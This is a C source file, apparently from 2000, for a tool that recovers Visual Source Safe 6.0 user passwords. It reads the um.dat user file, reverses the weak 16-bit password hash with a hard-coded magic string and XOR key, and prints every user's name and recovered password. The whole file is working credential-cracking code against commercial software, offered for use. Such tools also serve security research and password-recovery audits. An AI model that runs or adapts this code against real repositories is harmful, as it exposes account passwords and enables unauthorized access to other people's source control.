//compiled with VC++ 6.0
#include <stdio.h>
#include <process.h>
#include <windows.h>

#define RANGE_DOWN1 0xA0
#define RANGE_UP1 0xDF //range 0x20 (space)-0x5F(_) xored with 0x96

#define RANGE_DOWN2 0x40
#define RANGE_UP2 0x5F //range 0xC0 (À)-0xDF(ß) xored with 0x96 signed!!!

#define USERS_OFFSET 0x7C
#define USER_SIZE 0x40
#define USER_NAME_OFFSET 0x8
#define HASH_OFFSET 0x28

static unsigned char magic[]="BrianDavidHarry";

void main()
{
	printf("\nVisual Source Safe V6.0 passwords recovery tool v1.01.\n(c) Lexey, 2000\n");
	int i,j;
	FILE *in;
	if((in=fopen("um.dat","rb"))==NULL)
	{
		printf("Can't open file UM.DAT.\nIt must be present in the current directory.\n");
		exit(1);
	}
	if(fseek(in,USERS_OFFSET,SEEK_SET))
	{
		printf("Seek error.\nFile UM.DAT may be corrupted or incorrect.\n");
		exit(2);
	}
	unsigned long *mptr=(unsigned long *)magic;
	for(i=0;i<4;i++) *mptr++^=0x96969696;
	unsigned short magic_hash[16];
	for(i=0;i<16;i++)
	{
		unsigned short hm=0;
		for(j=0;j<15-i;j++) hm+=magic[j]*(j+i+1);
		magic_hash[i]=hm;
	}	
	unsigned short hrd1=0,hru1=0;
	unsigned short hrd2=0,hru2=0;
	unsigned short temp11=0,temp12=0;
	unsigned short temp21=0,temp22=0;
	unsigned short temp3=0,sm=0;
	unsigned short pure_range_down1[16];
	unsigned short pure_range_up1[16];
	unsigned short pure_range_down2[16];
	unsigned short pure_range_up2[16];
	unsigned short mixed_range_down1[16];
	unsigned short mixed_range_up1[16];
	unsigned short mixed_range_down2[16];
	unsigned short mixed_range_up2[16];
	unsigned short signed_modifier[16];
	unsigned short position_signed_modifier[16];
	unsigned short position_range_down_modifier[16];
	unsigned short position_range_up_modifier[16];
	unsigned short Ni[16];
	unsigned short temp4=0;
	for(i=0;i<16;i++)
	{
		temp4+=i;
		Ni[i]=temp4;
		
		position_range_down_modifier[i]=temp11-temp21;
		position_range_up_modifier[i]=temp12-temp22;

		pure_range_down1[i]=hrd1;
		mixed_range_down1[i]=hrd1+magic_hash[i];
		temp11+=RANGE_DOWN1; //RANGE_DOWN1*i
		hrd1+=temp11;
		pure_range_up1[i]=hru1;
		mixed_range_up1[i]=hru1+magic_hash[i];
		temp12+=RANGE_UP1; //RANGE_UP1*i
		hru1+=temp12;

		pure_range_down2[i]=hrd2;
		mixed_range_down2[i]=hrd2+magic_hash[i];
		temp21+=RANGE_DOWN2; //RANGE_DOWN2*i
		hrd2+=temp21;
		pure_range_up2[i]=hru2;
		mixed_range_up2[i]=hru2+magic_hash[i];
		temp22+=RANGE_UP2; //RANGE_UP2*i
		hru2+=temp22;

		signed_modifier[i]=sm;
		position_signed_modifier[i]=temp3;
		temp3+=0xFF00;
		sm+=temp3;

		
	}
	unsigned short double_range_modifiers[0x8000][3]; //2^15 0-hash modifier, 1- hash mod. - low range mod., 2-hash mod. - up range mod.
	memset(double_range_modifiers,0,0x8000*3*2);
	int k;
	for(i=0;i<0x8000;i++)
	{
		for(k=1,j=1;k<=15;j<<=1,k++)
			if(i&j)
			{
				double_range_modifiers[i][0]+=position_signed_modifier[k];
				double_range_modifiers[i][1]+=position_range_down_modifier[k];
				double_range_modifiers[i][2]+=position_range_up_modifier[k];
			}
	}
	//init done
	unsigned char buffer[USER_SIZE];
	unsigned char password[16];
	unsigned char *phash=buffer+HASH_OFFSET;
	char *puname=(char *)buffer+USER_NAME_OFFSET;
	while(fread(buffer,USER_SIZE,1,in)) //iterate through users
	{
		unsigned short hash=*((unsigned short *)(phash));
		for(i=0;i<16;i++)
			if(hash>=mixed_range_down1[i] && hash<=mixed_range_up1[i]) break;//search for shortest possible password
		if(i>15)
		{
			for(i=0;i<16;i++)
				if((unsigned short)(hash-signed_modifier[i])>=mixed_range_down2[i] && (unsigned short)(hash-signed_modifier[i])<=mixed_range_up2[i]) break;//search for shortest possible password
			if(i>15)
			{
				int limit=1;
				for(i=1;i<16,limit>0;i++)
				{
					unsigned short hash2=hash-magic_hash[i];
					limit<<=1; //2**i
					for(j=1;j<limit;j++) //loop for all variants
					{
						if((unsigned short)(hash2-double_range_modifiers[j][0])>=(unsigned int)(pure_range_down1[i]-double_range_modifiers[j][1]) && (unsigned short)(hash2-double_range_modifiers[j][0])<=(unsigned int)(pure_range_up1[i]-double_range_modifiers[j][2])) break;
					}
					if(j<limit)
					{
						hash2-=double_range_modifiers[j][0]+pure_range_down1[i]-double_range_modifiers[j][1]; //remove signed part and down limit
						int nb=0;
						int l2;
						for(k=1,l2=1;l2<limit;k++,l2<<=1) if(l2&j) nb+=k;
						int x=hash2/(Ni[i]-nb); //try to solve n1*x+n2*y<<hash2<<n1*(x+1)+n2*(x+2)
						int y;
						if(x>=RANGE_UP1-RANGE_DOWN1) x=RANGE_UP1-RANGE_DOWN1-1;
						hash2-=x*(Ni[i]-nb);
						y=hash2/nb;
						hash2-=y*nb;
						x+=RANGE_DOWN1;
						y+=RANGE_DOWN2;
						for(k=i;k>0;k--)
						{
							limit>>=1;
							int h;
							if(hash2>=k)
							{
								h=1;
								hash2-=k;
							}
							else h=0;
							if(j&limit) //char in range 2
							{
								password[k-1]=y+h;
							}
							else
							{
								password[k-1]=x+h;
							}
						}
						i--;
						limit=0;
					}
				}
			}
			else
			{				
				hash-=signed_modifier[i]+magic_hash[i];
				int h=hash/Ni[i];
				hash-=h*Ni[i];
				for(j=i;j>0;j--)
				{
					if(hash>=j)
					{
						password[j-1]=h+1;
						hash-=j;
					}
					else password[j-1]=h;
				}
			}
		}
		else
		{
			if(i>0)
			{
				hash-=magic_hash[i];
				int h=hash/Ni[i];
				hash-=h*Ni[i];
				for(j=i;j>0;j--)
				{
					if(hash>=j)
					{
						password[j-1]=h+1;
						hash-=j;
					}
					else password[j-1]=h;
				}
			}
		}
		if(i>15) printf("User: %s - password: Sorry, password can not be found in these character sets.\n",puname);
		else
		{
			for(j=0;j<i;j++) password[j]^=0x96;
			password[i]=0;
			CharToOem((char *)password,(char *)password);
			printf("User: %s - password: {%s}\n",puname,password);
		}
	}
	fclose(in);
	printf("No more users. All done.\n");
}